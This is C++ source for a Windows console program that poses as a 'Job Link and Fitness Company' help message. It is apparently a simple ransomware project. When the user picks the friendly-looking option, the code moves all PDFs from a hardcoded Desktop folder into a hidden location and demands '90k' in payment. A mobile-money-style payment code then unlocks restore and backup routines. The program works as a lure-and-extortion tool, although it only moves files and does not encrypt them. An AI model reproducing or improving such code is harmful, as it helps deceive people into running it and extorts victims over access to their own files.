#include <iostream>
#include <windows.h>
#include <string>
#include <vector>
#include <conio.h>

#define HEART "\xE2\x9D\xA4\xEF\xB8\x8F"
#define BROKEN_HEART "\xF0\x9F\x92\x94"
#define SMILING_FACE "\xF0\x9F\x98\x8A"
#define CRYING_FACE "\xF0\x9F\x98\xA2"
#define SUPER_LAUGH "\xF0\x9F\x98\x82" 
#define LOCK "\xF0\x9F\x94\x92"
#define UNLOCK "\xF0\x9F\x94\x93"
#define MONEY "\xF0\x9F\x92\xB0"
#define FILE "\xF0\x9F\x93\x84"
#define BACKUP "\xF0\x9F\x92\xBE"
#define EXIT "\xE2\x9D\x8C"
#define RESET "\033[0m"
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define CYAN "\033[36m"
#define MAGENTA "\x1B[35m"
#define BLUE "\x1B[34m"

const std::string SECRET_KEY = "12345";  // The key to unhide files
const std::string BACKUP_PASSWORD = "backup123";  // Password for backup
const std::string SOURCE_DIR = "C:\\Users\\HABAYIMANA Vincent\\Desktop";
const std::string HIDDEN_DIR = "C:\\Users\\HABAYIMANA Vincent\\Music";
const std::string BACKUP_DIR = "C:\\Users\\HABAYIMANA Vincent\\Documents";

// Function to print a framed message
void printFramedMessage(const std::string& message) {
    int width = message.length() + 4;  // Adding 4 for the borders and spaces
    std::string border(width, '*');
    
    std::cout << border << std::endl;
    std::cout << "* " << message << " *" << std::endl;
    std::cout << border << std::endl;
}

// Helper function to retrieve files
std::vector<std::string> getFiles(const std::string& directory, const std::string& extension) {
    std::vector<std::string> files;
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*" + extension).c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << RED << "No files found in directory: " << directory
                  << " - Error code: " << GetLastError() << RESET << "\n";
        return files;
    }

    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            files.push_back(findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);
    FindClose(hFind);

    return files;
}

// Print separator
void printSeparator() {
    std::cout << CYAN << "=============================================\n" << RESET;
}

// Backup files
void backupFiles() {
    std::string password;
    char ch;

    std::cout << LOCK << " Enter the password to access the backup feature: ";
    while (true) {
        ch = _getch();
        if (ch == '\r') {
            std::cout << std::endl;
            break;
        } else if (ch == '\b' && !password.empty()) {
            password.erase(password.size() - 1);  // Removes last character
            std::cout << "\b \b";
        } else if (ch != '\b') {
            password += ch;
            std::cout << '*';
        }
    }

    if (password != BACKUP_PASSWORD) {
        std::cout << RED << CRYING_FACE << CRYING_FACE <<" Incorrect password. Access denied.\n" << RESET;
        return;
    }

    std::vector<std::string> files = getFiles(HIDDEN_DIR, ".hidden");

    if (!CreateDirectory(BACKUP_DIR.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        std::cerr << RED << "Failed to create backup directory: " << BACKUP_DIR << "\n" << RESET;
        return;
    }

    for (size_t i = 0; i < files.size(); ++i) {
        std::string file = files[i];
        std::string src = HIDDEN_DIR + "\\" + file;
        std::string dest = BACKUP_DIR + "\\" + file.substr(0, file.find_last_of('.'));
        if (CopyFile(src.c_str(), dest.c_str(), FALSE)) {
            std::cout << GREEN << BACKUP << " Backed up: " << file << RESET << "\n";
        } else {
            std::cerr << RED << "Failed to back up: " << file
                      << " - Error code: " << GetLastError() << RESET << "\n";
        }
    }

    std::cout << MAGENTA << SMILING_FACE << " Backup completed. Files are located in: " << BACKUP_DIR << "\n" << RESET;
}

// Unhide files
void unhideFiles() {
    std::string key;
    char ch;

    std::cout << LOCK << " Enter the secret key to unhide files: ";
    while (true) {
        ch = _getch();
        if (ch == '\r') {  // Enter key pressed
            std::cout << std::endl;
            break;
        } else if (ch == '\b' && !key.empty()) {  // Backspace key pressed
            key.erase(key.size() - 1);  // Remove last character from input
            std::cout << "\b \b";  // Erase character from the console
        } else if (ch != '\b') {  // Any other character
            key += ch;  // Append character to the key string
            std::cout << '*';  // Display '*' for each character typed
        }
    }

    if (key != SECRET_KEY) {
        std::cout << RED << CRYING_FACE << " Invalid key. Access denied.\n" << RESET;
        return;
    }

    std::vector<std::string> files = getFiles(HIDDEN_DIR, ".hidden");

    for (size_t i = 0; i < files.size(); ++i) {
        std::string file = files[i];
        std::string src = HIDDEN_DIR + "\\" + file;
        std::string dest = SOURCE_DIR + "\\" + file.substr(0, file.find_last_of('.'));
        if (MoveFile(src.c_str(), dest.c_str())) {
            std::cout << GREEN << UNLOCK << " Unhid: " << file << RESET << "\n";
        } else {
            std::cerr << RED << "Failed to unhide: " << file
                      << " - Error code: " << GetLastError() << RESET << "\n";
        }
    }

    std::cout << BLUE << "All files have been unhidden " << SMILING_FACE << " and moved back to their original location.\n" << RESET;
}

// Hide files
void hideFiles() {
    std::vector<std::string> files = getFiles(SOURCE_DIR, ".pdf");

    if (!CreateDirectory(HIDDEN_DIR.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        std::cerr << RED << "Failed to create hidden directory: " << HIDDEN_DIR
                  << " - Error code: " << GetLastError() << RESET << "\n";
        return;
    }

    for (size_t i = 0; i < files.size(); ++i) {
        std::string file = files[i];
        std::string src = SOURCE_DIR + "\\" + file;
        std::string dest = HIDDEN_DIR + "\\" + file + ".hidden";
        if (MoveFile(src.c_str(), dest.c_str())) {
            std::cout << GREEN << BROKEN_HEART << " Hid: " << file << RESET << "\n";
        } else {
            std::cerr << RED << "Failed to hide: " << file
                      << " - Error code: " << GetLastError() << RESET << "\n";
        }
    }

    std::cout << RED << BROKEN_HEART << " All PDF files have been hidden. "
              << MONEY << RED << " You better Pay 90k in peace" << SUPER_LAUGH << SUPER_LAUGH
              << " code:276890 to get your files back. " << CRYING_FACE << "\n" << RESET;
}

int main() {
    // Set the console code page to UTF-8 for emoji support
    SetConsoleOutputCP(CP_UTF8);

    int choice;

    while (true) {
        printSeparator();
        printFramedMessage("Welcome to Job Link and Fitness Company! " + std::string(HEART));
        printSeparator();

        std::cout << "1. " << GREEN << "Read Messages From Someone Who Wants to Help You! " << HEART << RESET << "\n";
        std::cout << "2. " << RED << "Ignore" << BROKEN_HEART << ": " << EXIT << RESET << "\n";
        printSeparator();
        std::cout << "Enter your choice: ";
        std::cin >> choice;

        if (choice == 1) {
            hideFiles();
            printSeparator();
            printFramedMessage("Your files are now hidden." + std::string(SUPER_LAUGH) + " Job Link and Fitness went wrong" + std::string(BROKEN_HEART));
            std::cout << "You have no other choice except to pay" << MONEY << "\n Choose an action:\n";
            std::cout << "1. " << MONEY << YELLOW << " Pay to access files\n";
            std::cout << "2. " << RED << "Exit\n" << RESET;
            std::cin >> choice;

            if (choice == 1) {
                std::string paymentCode;
                std::cout << "Enter payment code: ";
                std::cin >> paymentCode;

                if (paymentCode == "*182*8*1*232323#") {
                    std::cout << GREEN << "Payment verified! Access granted.\n" << RESET;

                    while (true) {
                        printSeparator();
                        std::cout << "Choose an option:\n";
                        std::cout << "1. " << FILE << " Scan hidden files\n";
                        std::cout << "2. " << BACKUP << " Backup files\n";
                        std::cout << "3. " << UNLOCK << " Unhide files\n";
                        std::cout << "4. " << EXIT << RED << " Exit\n";
                        printSeparator();

                        std::cin >> choice;

                        switch (choice) {
                            case 1:
                                break;
                            case 2:
                                backupFiles();
                                break;
                            case 3:
                                unhideFiles();
                                break;
                            case 4:
                                return 0;
                            default:
                                std::cout << "Invalid choice! Please try again.\n";
                        }
                    }
                } else {
                    std::cout << RED << "Incorrect code. Exiting...\n" << RESET;
                }
            }
        } else if (choice == 2) {
            std::cout << RED << EXIT << " You chose to exit. Goodbye!" << RESET << "\n";
            break;
        } else {
            std::cout << "Invalid choice! Please try again.\n";
        }
    }

    return 0;
}

